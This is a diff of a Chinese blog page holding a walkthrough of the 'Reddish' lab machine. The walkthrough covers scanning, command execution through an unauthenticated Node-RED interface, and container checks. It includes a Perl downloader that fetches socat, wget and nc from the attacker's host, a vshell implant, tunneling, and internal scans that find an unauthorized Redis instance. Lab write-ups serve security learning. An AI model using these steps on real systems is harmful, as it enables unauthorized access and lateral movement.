@@ -1571,7 +1571,7 @@ drwx------  2 root root 4096 Jul 15  2018 .ssh
 <meta property="og:url" content="https://faabbi.github.io/post/Reddish.html">
 <meta property="og:image" content="https://avatars.githubusercontent.com/u/99706997?v=4">
 <title>Reddish</title>
-<link href="//unpkg.com/@wooorm/starry-night@2.1.1/style/both.css" rel="stylesheet" />
+
 
 
 </head>
@@ -1595,17 +1595,7 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     body {padding: 8px;}
     .postTitle{font-size:24px;}
 }
-.copy-feedback {
-    display: none;
-    position: absolute;
-    top: 10px;
-    right: 50px;
-    color: var(--color-fg-on-emphasis);
-    background-color: var(--color-fg-muted);
-    border-radius: 3px;
-    padding: 5px 8px;
-    font-size: 12px;
-}
+
 </style>
 
 
@@ -1639,46 +1629,47 @@ body{box-sizing: border-box;min-width: 200px;max-width: 900px;margin: 20px auto;
     <div id="content">
 <div class="markdown-body" id="postBody"><h1>信息收集</h1>
 <h2>TCP</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> nmap --min-rate 10000 -p- 10.129.17.102</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# nmap --min-rate 10000 -p- 10.129.17.102
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 14:57 CST
-Nmap scan report <span class="pl-k">for</span> 10.129.17.102 (10.129.17.102)
+Nmap scan report for 10.129.17.102 (10.129.17.102)
 Host is up (0.19s latency).
 Not shown: 65534 closed tcp ports (reset)
 PORT     STATE SERVICE
 1880/tcp open  vsat-control
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 10.71 seconds
+Nmap done: 1 IP address (1 host up) scanned in 10.71 seconds
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sV -sC -O -p1880 10.129.17.102</span>
+└─# nmap -sV -sC -O -p1880 10.129.17.102
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 14:57 CST
-Nmap scan report <span class="pl-k">for</span> 10.129.17.102 (10.129.17.102)
+Nmap scan report for 10.129.17.102 (10.129.17.102)
 Host is up (0.15s latency).
 
 PORT     STATE SERVICE VERSION
 1880/tcp open  http    Node.js Express framework
-<span class="pl-k">|</span>_http-title: Error
+|_http-title: Error
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Device type: general purpose
-Running: Linux 4.X<span class="pl-k">|</span>5.X
+Running: Linux 4.X|5.X
 OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
 OS details: Linux 4.15 - 5.19
 Network Distance: 2 hops
 
-OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="pl-c1">.</span>
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 19.44 seconds</pre></div>
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.44 seconds
+</code></pre>
 <h2>UDP</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> nmap -sU --top-ports 20 10.129.17.102</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# nmap -sU --top-ports 20 10.129.17.102
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-06 14:58 CST
-Nmap scan report <span class="pl-k">for</span> 10.129.17.102 (10.129.17.102)
+Nmap scan report for 10.129.17.102 (10.129.17.102)
 Host is up (0.12s latency).
 
 PORT      STATE         SERVICE
 53/udp    closed        domain
 67/udp    closed        dhcps
-68/udp    open<span class="pl-k">|</span>filtered dhcpc
+68/udp    open|filtered dhcpc
 69/udp    closed        tftp
 123/udp   closed        ntp
 135/udp   closed        msrpc
@@ -1697,37 +1688,40 @@ PORT      STATE         SERVICE
 4500/udp  closed        nat-t-ike
 49152/udp closed        unknown
 
-Nmap done: 1 IP address (1 host up) scanned <span class="pl-k">in</span> 17.58 seconds</pre></div>
+Nmap done: 1 IP address (1 host up) scanned in 17.58 seconds
+</code></pre>
 <p>1880端口是web服务，Node.js Express 框架</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> curl http://10.129.17.102:1880/</span>
-<span class="pl-k">&lt;</span><span class="pl-k">!</span>DOCTYPE html<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>html lang=<span class="pl-s"><span class="pl-pds">"</span>en<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>head<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>meta charset=<span class="pl-s"><span class="pl-pds">"</span>utf-8<span class="pl-pds">"</span></span><span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>title<span class="pl-k">&gt;</span>Error<span class="pl-k">&lt;</span>/title<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>/head<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>body<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>pre<span class="pl-k">&gt;</span>Cannot GET /<span class="pl-k">&lt;</span>/pre<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>/body<span class="pl-k">&gt;</span>
-<span class="pl-k">&lt;</span>/html<span class="pl-k">&gt;</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">┌──(root㉿MJ)-[/tmp/test]
+└─# curl http://10.129.17.102:1880/
+&lt;!DOCTYPE html&gt;
+&lt;html lang="en"&gt;
+&lt;head&gt;
+&lt;meta charset="utf-8"&gt;
+&lt;title&gt;Error&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;pre&gt;Cannot GET /&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
 
 ┌──(root㉿MJ)-[/tmp/test]
-└─<span class="pl-c"><span class="pl-c">#</span> curl -X POST http://10.129.17.102:1880/</span>
-{<span class="pl-s"><span class="pl-pds">"</span>id<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>4db178d6acb2d603fb188eda5fb10ac1<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>ip<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>::ffff:10.10.16.15<span class="pl-pds">"</span></span>,<span class="pl-s"><span class="pl-pds">"</span>path<span class="pl-pds">"</span></span>:<span class="pl-s"><span class="pl-pds">"</span>/red/{id}<span class="pl-pds">"</span></span>}</pre></div>
+└─# curl -X POST http://10.129.17.102:1880/
+{"id":"4db178d6acb2d603fb188eda5fb10ac1","ip":"::ffff:10.10.16.15","path":"/red/{id}"}
+</code></pre>
 <p>返回提示/red/id<br>
 访问发现是未授权的  Node-RED接口，可以执行命令<br>
 ![[Pasted image 20251206150321.png]]<br>
 如上设置即可执行命令，点击部署，在点击inject左边的小方块即可，inject设置文字列</p>
 <h1>立足点+横向移动</h1>
 <h2>docker(172.19.0.2/172.18.0.2)</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:/node-red# id
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:/node-red# id
 uid=0(root) gid=0(root) groups=0(root)
-root@nodered:/node-red# ls -al /.dock<span class="pl-k">*</span>
+root@nodered:/node-red# ls -al /.dock*
 -rwxr-xr-x 1 root root 0 May  4  2018 /.dockerenv
-root@nodered:/node-red#</pre></div>
+root@nodered:/node-red#
+</code></pre>
 <p>进来就是root，不过茛目dockerrnv文件也证实了这是docker容器，同样也可以使用</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:/node-red# cat /proc/1/cgroup
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:/node-red# cat /proc/1/cgroup
 12:freezer:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
 11:hugetlb:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
 10:rdma:/
@@ -1741,111 +1735,117 @@ root@nodered:/node-red#</pre></div>
 2:net_cls,net_prio:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
 1:name=systemd:/docker/c075cbb82a4a9e0532ba61056d5651b7c855c0153c8156bf0c4eae3b1c4d25c9
 0::/system.slice/docker.service
-root@nodered:/node-red#</pre></div>
+root@nodered:/node-red#
+</code></pre>
 <h3>判断是否为特权容器</h3>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:/node-red# fdisk -l <span class="pl-k">|</span> grep -A 10 -i <span class="pl-s"><span class="pl-pds">"</span>device<span class="pl-pds">"</span></span>
-root@nodered:/node-red# cat /proc/1/status <span class="pl-k">|</span> grep -i <span class="pl-s"><span class="pl-pds">"</span>seccomp<span class="pl-pds">"</span></span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:/node-red# fdisk -l | grep -A 10 -i "device"
+root@nodered:/node-red# cat /proc/1/status | grep -i "seccomp"
 Seccomp:        2
 root@nodered:/node-red# ls /dev
-core  fd  full  mqueue  null  ptmx  pts  random  shm  stderr  stdin  stdout  tty  urandom  zero</pre></div>
+core  fd  full  mqueue  null  ptmx  pts  random  shm  stderr  stdin  stdout  tty  urandom  zero
+</code></pre>
 <p>可以看到是非特权容器</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:/node-red# capsh --print <span class="pl-k">|</span> grep sys_admin
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:/node-red# capsh --print | grep sys_admin
 root@nodered:/node-red# cat /sys/kernel/security/apparmor/profiles
-cat: /sys/kernel/security/apparmor/profiles: No such file or directory</pre></div>
+cat: /sys/kernel/security/apparmor/profiles: No such file or directory
+</code></pre>
 <p>同样的不具备<strong>CAP_SYS_ADMIN</strong>这个功能，但没有开启<strong>AppArmor</strong>，这种情况下，除非具有已知漏洞，否则很难逃逸</p>
 <h2>一层内网横向</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:/node-red# ip a
-1: lo: <span class="pl-k">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:/node-red# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
        valid_lft forever preferred_lft forever
-9: eth1@if10: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc noqueue state UP group default
+9: eth1@if10: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
     link/ether 02:42:ac:13:00:02 brd ff:ff:ff:ff:ff:ff
     inet 172.19.0.2/16 brd 172.19.255.255 scope global eth1
        valid_lft forever preferred_lft forever
-11: eth0@if12: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc noqueue state UP group default
+11: eth0@if12: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default
     link/ether 02:42:ac:12:00:02 brd ff:ff:ff:ff:ff:ff
     inet 172.18.0.2/16 brd 172.18.255.255 scope global eth0
-       valid_lft forever preferred_lft forever</pre></div>
+       valid_lft forever preferred_lft forever
+</code></pre>
 <p>可以看到这个docker有两张内网网卡，考虑横向移动寻找突破点</p>
 <h3>工具传递</h3>
 <p>这是环境极其恶劣的docker环境，什么工具都没有，但是大多系统都具有perl环境，可以利用perl来传工具</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:/node-red# perl -v
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:/node-red# perl -v
 
-This is perl 5, version 20, subversion 2 (v5.20.2) built <span class="pl-k">for</span> x86_64-linux-gnu-thread-multi
-(with 101 registered patches, see perl -V <span class="pl-k">for</span> more detail)
+This is perl 5, version 20, subversion 2 (v5.20.2) built for x86_64-linux-gnu-thread-multi
+(with 101 registered patches, see perl -V for more detail)
 
 Copyright 1987-2015, Larry Wall
 
 Perl may be copied only under the terms of either the Artistic License or the
-GNU General Public License, which may be found <span class="pl-k">in</span> the Perl 5 <span class="pl-c1">source</span> kit.
+GNU General Public License, which may be found in the Perl 5 source kit.
 
-Complete documentation <span class="pl-k">for</span> Perl, including FAQ lists, should be found on
-this system using <span class="pl-s"><span class="pl-pds">"</span>man perl<span class="pl-pds">"</span></span> or <span class="pl-s"><span class="pl-pds">"</span>perldoc perl<span class="pl-pds">"</span></span>.  If you have access to the
-Internet, point your browser at http://www.perl.org/, the Perl Home Page.</pre></div>
+Complete documentation for Perl, including FAQ lists, should be found on
+this system using "man perl" or "perldoc perl".  If you have access to the
+Internet, point your browser at http://www.perl.org/, the Perl Home Page.
+</code></pre>
 <h4>脚本</h4>
-<div class="highlight highlight-source-perl"><pre class="notranslate"><span class="pl-c"><span class="pl-c">#</span>!/usr/bin/perl</span>
-<span class="pl-k">use</span> strict;
-<span class="pl-k">use</span> warnings;
-<span class="pl-k">use</span> IO::Socket::INET;
+<pre lang="perl" class="notranslate"><code class="notranslate">#!/usr/bin/perl
+use strict;
+use warnings;
+use IO::Socket::INET;
 
-<span class="pl-k">die</span> <span class="pl-s"><span class="pl-pds">"</span>Usage: perl downloader.pl &lt;host&gt; &lt;port&gt; &lt;remote_path&gt; &lt;outfile&gt;<span class="pl-cce">\n</span><span class="pl-pds">"</span></span> <span class="pl-k">unless</span> <span class="pl-smi">@ARGV</span>==4;
-<span class="pl-k">my</span> (<span class="pl-smi">$host</span>,<span class="pl-smi">$port</span>,<span class="pl-smi">$path</span>,<span class="pl-smi">$outfile</span>)=<span class="pl-smi">@ARGV</span>;
-<span class="pl-smi">$path</span> = <span class="pl-s"><span class="pl-pds">"</span>/<span class="pl-smi">$path</span><span class="pl-pds">"</span></span> <span class="pl-k">unless</span> <span class="pl-smi">$path</span> =~ <span class="pl-sr"><span class="pl-pds"><span class="pl-c1">m</span>{</span>^/<span class="pl-pds">}</span></span>;
+die "Usage: perl downloader.pl &lt;host&gt; &lt;port&gt; &lt;remote_path&gt; &lt;outfile&gt;\n" unless @ARGV==4;
+my ($host,$port,$path,$outfile)=@ARGV;
+$path = "/$path" unless $path =~ m{^/};
 
-<span class="pl-k">my</span> <span class="pl-smi">$sock</span> = IO::Socket::INET<span class="pl-k">-&gt;</span>new(
-    <span class="pl-c1">PeerAddr</span> <span class="pl-k">=&gt;</span> <span class="pl-smi">$host</span>,
-    <span class="pl-c1">PeerPort</span> <span class="pl-k">=&gt;</span> <span class="pl-smi">$port</span>,
-    <span class="pl-c1">Proto</span>    <span class="pl-k">=&gt;</span> <span class="pl-s"><span class="pl-pds">'</span>tcp<span class="pl-pds">'</span></span>,
-    <span class="pl-c1">Timeout</span>  <span class="pl-k">=&gt;</span> 10
-) <span class="pl-k">or</span> <span class="pl-k">die</span> <span class="pl-s"><span class="pl-pds">"</span>connect failed to <span class="pl-smi">$host</span>:<span class="pl-smi">$port</span>: <span class="pl-smi">$!</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>;
+my $sock = IO::Socket::INET-&gt;new(
+    PeerAddr =&gt; $host,
+    PeerPort =&gt; $port,
+    Proto    =&gt; 'tcp',
+    Timeout  =&gt; 10
+) or die "connect failed to $host:$port: $!\n";
 
-<span class="pl-c1">binmode</span> <span class="pl-smi">$sock</span>;
-<span class="pl-c1">print</span> <span class="pl-smi">$sock</span> <span class="pl-s"><span class="pl-pds">"</span>GET <span class="pl-smi">$path</span> HTTP/1.0<span class="pl-cce">\r\n</span>Host: <span class="pl-smi">$host</span><span class="pl-cce">\r\n</span>Connection: close<span class="pl-cce">\r\n\r\n</span><span class="pl-pds">"</span></span>;
+binmode $sock;
+print $sock "GET $path HTTP/1.0\r\nHost: $host\r\nConnection: close\r\n\r\n";
 
-<span class="pl-c1">open</span> <span class="pl-k">my</span> <span class="pl-smi">$out</span>, <span class="pl-s"><span class="pl-pds">'</span>&gt;:raw<span class="pl-pds">'</span></span>, <span class="pl-smi">$outfile</span> <span class="pl-k">or</span> <span class="pl-k">die</span> <span class="pl-s"><span class="pl-pds">"</span>open <span class="pl-smi">$outfile</span>: <span class="pl-smi">$!</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>;
+open my $out, '&gt;:raw', $outfile or die "open $outfile: $!\n";
 
-<span class="pl-k">my</span> <span class="pl-smi">$buff</span> = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>;
-<span class="pl-k">my</span> <span class="pl-smi">$header_parsed</span> = 0;
-<span class="pl-k">while</span> (1) {
-    <span class="pl-k">my</span> <span class="pl-smi">$read</span>;
-    <span class="pl-k">my</span> <span class="pl-smi">$n</span> = <span class="pl-c1">sysread</span>(<span class="pl-smi">$sock</span>, <span class="pl-smi">$read</span>, 8192);
-    <span class="pl-k">last</span> <span class="pl-k">unless</span> <span class="pl-smi">$n</span>;
-    <span class="pl-k">if</span> (!<span class="pl-smi">$header_parsed</span>) {
-        <span class="pl-smi">$buff</span> .= <span class="pl-smi">$read</span>;
-        <span class="pl-k">my</span> <span class="pl-smi">$idx</span> = <span class="pl-c1">index</span>(<span class="pl-smi">$buff</span>, <span class="pl-s"><span class="pl-pds">"</span><span class="pl-cce">\r\n\r\n</span><span class="pl-pds">"</span></span>);
-        <span class="pl-k">if</span> (<span class="pl-smi">$idx</span> &gt;= 0) {
-            <span class="pl-c"><span class="pl-c">#</span> write everything after the header</span>
-            <span class="pl-k">my</span> <span class="pl-smi">$body</span> = <span class="pl-c1">substr</span>(<span class="pl-smi">$buff</span>, <span class="pl-smi">$idx</span> + 4);
-            <span class="pl-c1">print</span> <span class="pl-smi">$out</span> <span class="pl-smi">$body</span> <span class="pl-k">if</span> <span class="pl-c1">length</span> <span class="pl-smi">$body</span>;
-            <span class="pl-smi">$buff</span> = <span class="pl-s"><span class="pl-pds">'</span><span class="pl-pds">'</span></span>;
-            <span class="pl-smi">$header_parsed</span> = 1;
-        } <span class="pl-k">else</span> {
-            <span class="pl-c"><span class="pl-c">#</span> keep only last 3 bytes to avoid unlimited growth (boundary len 4)</span>
-            <span class="pl-k">if</span> (<span class="pl-c1">length</span>(<span class="pl-smi">$buff</span>) &gt; 4096) {
-                <span class="pl-smi">$buff</span> = <span class="pl-c1">substr</span>(<span class="pl-smi">$buff</span>, -3);
+my $buff = '';
+my $header_parsed = 0;
+while (1) {
+    my $read;
+    my $n = sysread($sock, $read, 8192);
+    last unless $n;
+    if (!$header_parsed) {
+        $buff .= $read;
+        my $idx = index($buff, "\r\n\r\n");
+        if ($idx &gt;= 0) {
+            # write everything after the header
+            my $body = substr($buff, $idx + 4);
+            print $out $body if length $body;
+            $buff = '';
+            $header_parsed = 1;
+        } else {
+            # keep only last 3 bytes to avoid unlimited growth (boundary len 4)
+            if (length($buff) &gt; 4096) {
+                $buff = substr($buff, -3);
             }
         }
-    } <span class="pl-k">else</span> {
-        <span class="pl-c1">print</span> <span class="pl-smi">$out</span> <span class="pl-smi">$read</span>;
+    } else {
+        print $out $read;
     }
 }
-<span class="pl-c1">close</span> <span class="pl-smi">$out</span>;
-<span class="pl-c1">close</span> <span class="pl-smi">$sock</span>;
-<span class="pl-c1">print</span> <span class="pl-s"><span class="pl-pds">"</span>Saved <span class="pl-smi">$outfile</span><span class="pl-cce">\n</span><span class="pl-pds">"</span></span>;</pre></div>
+close $out;
+close $sock;
+print "Saved $outfile\n";
+</code></pre>
 <p>用法<code class="notranslate">perl download.pl ip port remote_name local_name</code></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> perl downloader.pl 10.10.16.15 2331 socat socat</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:~# perl downloader.pl 10.10.16.15 2331 socat socat
 Saved socat
-root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> perl downloader.pl 10.10.16.15 2331 curl curl</span>
+root@nodered:~# perl downloader.pl 10.10.16.15 2331 curl curl
 Saved curl
-root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> perl downloader.pl 10.10.16.15 2331 wget wget</span>
+root@nodered:~# perl downloader.pl 10.10.16.15 2331 wget wget
 Saved wget
-root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> perl downloader.pl 10.10.16.15 2331 nc nc</span>
+root@nodered:~# perl downloader.pl 10.10.16.15 2331 nc nc
 Saved nc
-root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> chmod +x *</span>
-root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ls -al</span>
+root@nodered:~# chmod +x *
+root@nodered:~# ls -al
 total 18128
-drwx------ 1 root root     4096 Dec  6 07:20 <span class="pl-c1">.</span>
+drwx------ 1 root root     4096 Dec  6 07:20 .
 drwxr-xr-x 1 root root     4096 Jul 15  2018 ..
 -rw-r--r-- 1 root root      570 Jan 31  2010 .bashrc
 drwx------ 1 root root     4096 Jul 15  2018 .config
@@ -1859,164 +1859,169 @@ drwxr-xr-x 5 root root     4096 Jul 15  2018 .npm
 -rwxr-xr-x 1 root root   836848 Dec  6 07:20 nc
 -rwxr-xr-x 1 root root   375176 Dec  6 07:19 socat
 -rwxr-xr-x 1 root root   100712 Dec  6 07:20 wget
-root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span></span></pre></div>
+root@nodered:~#
+</code></pre>
 <p>先上线vshell，然后搭个socks5隧道，后续传文件都方便</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> fscan -h 172.19.0.1/24</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:~# fscan -h 172.19.0.1/24
 
    ___                              _
-  / _ <span class="pl-cce">\ </span>    ___  ___ _ __ __ _  ___<span class="pl-k">|</span> <span class="pl-k">|</span> __
- / /_<span class="pl-cce">\/</span>____/ __<span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ _` |/ __| |/ /</span>
-<span class="pl-s">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span>
-<span class="pl-s">\____/     |___/\___|_|  \__,_|\___|_|\_\</span>
-<span class="pl-s">                     fscan version: 1.8.4</span>
-<span class="pl-s">start infoscan</span>
-<span class="pl-s">(icmp) Target 172.19.0.2      is alive</span>
-<span class="pl-s">(icmp) Target 172.19.0.1      is alive</span>
-<span class="pl-s">(icmp) Target 172.19.0.3      is alive</span>
-<span class="pl-s">(icmp) Target 172.19.0.4      is alive</span>
-<span class="pl-s">[*] Icmp alive hosts len is: 4</span>
-<span class="pl-s">172.19.0.3:6379 open</span>
-<span class="pl-s">172.19.0.4:80 open</span>
-<span class="pl-s">[*] alive ports len is: 2</span>
-<span class="pl-s">start vulscan</span>
-<span class="pl-s">[*] WebTitle http://172.19.0.4         code:200 len:2023   title:Reddish</span>
-<span class="pl-s">[+] Redis 172.19.0.3:6379 unauthorized file:/data/dump.rdb</span>
-<span class="pl-s">[+] Redis 172.19.0.3:6379 like can write /var/spool/cron/</span></pre></div>
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.19.0.2      is alive
+(icmp) Target 172.19.0.1      is alive
+(icmp) Target 172.19.0.3      is alive
+(icmp) Target 172.19.0.4      is alive
+[*] Icmp alive hosts len is: 4
+172.19.0.3:6379 open
+172.19.0.4:80 open
+[*] alive ports len is: 2
+start vulscan
+[*] WebTitle http://172.19.0.4         code:200 len:2023   title:Reddish
+[+] Redis 172.19.0.3:6379 unauthorized file:/data/dump.rdb
+[+] Redis 172.19.0.3:6379 like can write /var/spool/cron/
+</code></pre>
 <p>可以看到172.19.0.1/16这个内网段存在四台主机，172.18.0.1/16网段存活两台主机</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@nodered:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> fscan -h 172.19.0.1/16</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@nodered:~# fscan -h 172.19.0.1/16
 
    ___                              _
-  / _ <span class="pl-cce">\ </span>    ___  ___ _ __ __ _  ___<span class="pl-k">|</span> <span class="pl-k">|</span> __
- / /_<span class="pl-cce">\/</span>____/ __<span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-s"><span class="pl-pds">'</span>__/ _` |/ __| |/ /</span>
-<span class="pl-s">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;</span>
-<span class="pl-s">\____/     |___/\___|_|  \__,_|\___|_|\_\</span>
-<span class="pl-s">                     fscan version: 1.8.4</span>
-<span class="pl-s">start infoscan</span>
-<span class="pl-s">(icmp) Target 172.19.0.2      is alive</span>
-<span class="pl-s">(icmp) Target 172.19.0.1      is alive</span>
-<span class="pl-s">(icmp) Target 172.19.0.3      is alive</span>
-<span class="pl-s">(icmp) Target 172.19.0.4      is alive</span>
-<span class="pl-s">[*] LiveTop 172.19.0.0/16    段存活数量为: 4</span>
-<span class="pl-s">[*] LiveTop 172.19.0.0/24    段存活数量为: 4</span>
-<span class="pl-s">[*] Icmp alive hosts len is: 4</span>
-<span class="pl-s">172.19.0.3:6379 open</span>
-<span class="pl-s">172.19.0.4:80 open</span>
-<span class="pl-s">[*] alive ports len is: 2</span>
-<span class="pl-s">start vulscan</span>
-<span class="pl-s">[*] WebTitle http://172.19.0.4         code:200 len:2023   title:Reddish</span>
-<span class="pl-s">[+] Redis 172.19.0.3:6379 unauthorized file:/data/dump.rdb</span>
-<span class="pl-s">[+] Redis 172.19.0.3:6379 like can write /var/spool/cron/</span>
-<span class="pl-s">已完成 2/2</span>
-<span class="pl-s">[*] 扫描结束,耗时: 13.378180729s</span>
-<span class="pl-s"></span>
-<span class="pl-s">root@nodered:~# fscan -h 172.18.0.1/16</span>
-<span class="pl-s"></span>
-<span class="pl-s">   ___                              _</span>
-<span class="pl-s">  / _ \     ___  ___ _ __ __ _  ___| | __</span>
-<span class="pl-s"> / /_\/____/ __|/ __| <span class="pl-pds">'</span></span>__/ _<span class="pl-s"><span class="pl-pds">`</span> <span class="pl-k">|</span>/ __<span class="pl-k">|</span> <span class="pl-k">|</span>/ /</span>
-<span class="pl-s">/ /_<span class="pl-cce">\\</span>_____<span class="pl-cce">\_</span>_ <span class="pl-cce">\ </span>(__<span class="pl-k">|</span> <span class="pl-k">|</span> <span class="pl-k">|</span> (_<span class="pl-k">|</span> <span class="pl-k">|</span> (__<span class="pl-k">|</span>   <span class="pl-k">&lt;</span></span>
-<span class="pl-s"><span class="pl-cce">\_</span>___/     <span class="pl-k">|</span>___/<span class="pl-cce">\_</span>__<span class="pl-k">|</span>_<span class="pl-k">|</span>  <span class="pl-cce">\_</span>_,_<span class="pl-k">|</span><span class="pl-cce">\_</span>__<span class="pl-k">|</span>_<span class="pl-k">|</span><span class="pl-cce">\_</span>\</span>
-<span class="pl-s">                     fscan version: 1.8.4</span>
-<span class="pl-s">start infoscan</span>
-<span class="pl-s">(icmp) Target 172.18.0.2      is alive</span>
-<span class="pl-s">(icmp) Target 172.18.0.1      is alive</span>
-<span class="pl-s">[<span class="pl-k">*</span>] LiveTop 172.18.0.0/16    段存活数量为: 2</span>
-<span class="pl-s">[<span class="pl-k">*</span>] LiveTop 172.18.0.0/24    段存活数量为: 2</span>
-<span class="pl-s">[<span class="pl-k">*</span>] Icmp alive hosts len is: 2</span>
-<span class="pl-s">[<span class="pl-k">*</span>] alive ports len is: 0</span>
-<span class="pl-s">start vulscan</span>
-<span class="pl-s">已完成 0/0</span>
-<span class="pl-s">[<span class="pl-k">*</span>] 扫描结束,耗时: 6.357711346s</span></pre></div>
+  / _ \     ___  ___ _ __ __ _  ___| | __
+ / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
+/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
+\____/     |___/\___|_|  \__,_|\___|_|\_\
+                     fscan version: 1.8.4
+start infoscan
+(icmp) Target 172.19.0.2      is alive
+(icmp) Target 172.19.0.1      is alive
+(icmp) Target 172.19.0.3      is alive
+(icmp) Target 172.19.0.4      is alive
+[*] LiveTop 172.19.0.0/16    段存活数量为: 4
+[*] LiveTop 172.19.0.0/24    段存活数量为: 4
+[*] Icmp alive hosts len is: 4
+172.19.0.3:6379 open
+172.19.0.4:80 open
+[*] alive ports len is: 2
+start vulscan
+[*] WebTitle http://172.19.0.4         code:200 len:2023   title:Reddish
+[+] Redis 172.19.0.3:6379 unauthorized file:/data/dump.rdb
+[+] Redis 172.19.0.3:6379 like can write /var/spool/cron/
+已完成 2/2
+[*] 扫描结束,耗时: 13.378180729s
+
+root@nodered:~# fscan -h 172.18.0.1/16
+
+   ___                              _
+  / _ \     ___  ___ _ __ __ _  ___| | __
